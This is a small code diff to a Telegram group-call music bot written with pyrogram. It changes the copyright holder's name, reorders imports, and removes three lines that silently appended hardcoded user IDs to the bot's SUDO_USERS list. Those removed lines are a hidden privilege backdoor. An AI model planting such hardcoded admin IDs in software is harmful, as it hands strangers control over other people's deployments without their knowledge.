@@ -1,5 +1,5 @@
 # Calls Music 1 - Telegram bot for streaming audio in group calls
-# Copyright (C) 2021  Roj Serbest
+# Copyright (C) 2021  amort
 
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU Affero General Public License as
@@ -20,12 +20,9 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 
-from helpers.admins import get_administrators
 from config import SUDO_USERS
+from helpers.admins import get_administrators
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
 
 
 def errors(func: Callable) -> Callable:
